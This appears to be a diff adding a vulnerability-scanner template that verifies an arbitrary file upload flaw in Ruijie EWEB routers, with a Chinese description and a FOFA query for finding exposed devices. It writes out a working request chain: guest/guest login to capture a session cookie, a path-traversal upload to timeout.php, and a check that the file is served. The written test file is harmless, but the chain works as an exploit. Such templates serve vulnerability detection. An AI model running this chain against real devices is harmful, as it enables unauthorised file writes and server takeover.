@@ -1,0 +1,54 @@
+## id: VEID-2025-0116
+## name: 锐捷 EWEB路由器 timeout.php任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2025
+## description: 锐捷睿易是锐捷网络面向商务市场的子品牌。拥有便捷的网络、交换机、路由器、无线、安全、云服务六大产品线，解决方案涵盖商业零售、酒店、kt、网吧、监控与安全、物流、仓储、制造。通过该漏洞，攻击者可以任意执行服务器端的代码，编写后门，获得服务器权限，进而控制整个web服务器。
+## affects: 锐捷 EWEB路由器
+## fofa-query: title="锐捷网络-EWEB网管系统"
+## verification: true
+
+
+POST /ddi/server/login.php HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+username=guest&password=guest?
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Set-Cookie"] contains "RUIJIEID"
+#> extract: name=ruijie_cookie, from=header["Set-Cookie"], regex=/RUIJIEID=([^;]+)/, group=1, internal=true
+
+---
+
+POST /system_pi/timeout.php?a=upload HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: RUIJIEID={{ruijie_cookie}}; path=/; HttpOnly; RUIJIEID={{ruijie_cookie}}
+Content-Type: application/x-www-form-urlencoded
+
+fileName=../tmp/html/a.txt&mes=hello veil
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "json" 
+#@ matcher: body contains "true"
+
+
+---
+
+GET /a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: 257a3d37cbb6119094e38554ca85735f46b52c2fdd4e4f2f10388c0916f158fb
